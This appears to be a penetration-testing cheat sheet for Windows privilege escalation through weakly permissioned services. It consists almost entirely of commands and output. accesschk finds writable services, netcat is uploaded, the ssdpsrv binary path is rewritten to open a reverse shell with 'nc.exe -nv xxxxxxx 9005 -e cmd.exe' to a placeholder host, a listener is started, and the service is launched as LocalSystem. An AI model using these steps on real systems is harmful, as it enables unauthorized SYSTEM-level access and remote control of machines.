# Weak service permissions

Find services that have weak service permissions, and modify them to trigger your shell.

```sh
C:\\temp>accesschk.exe -uwcqv IWAM_BOB * /accepteula 
accesschk.exe -uwcqv IWAM_BOB * /accepteula 
RW SSDPSRV 
   SERVICE_ALL_ACCESS 
RW upnphost 
   SERVICE_ALL_ACCESS 
```

Upload nc.exe to c:\temp

```sh
sc qc ssdpsrv
C:\\temp>sc qc ssdpsrv
sc qc ssdpsrv
[SC] GetServiceConfig SUCCESS

SERVICE_NAME: ssdpsrv
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\temp\nc.exe -nv xxxxxxx 9005 -e C:\WINDOWS\System32\cmd.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : SSDP Discovery Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

sc config upnphost obj= ".\LocalSystem" password= ""
sc config ssdpsrv start= auto
sc config ssdpsrv binpath= "C:\temp\nc.exe -nv xxxxxxx 9005 -e C:\WINDOWS\System32\cmd.exe"
``` 

Set up listener

```sh
nc -lnvp 9005
```

Start service

```sh
net start ssdpsrv
```

Here is your shell



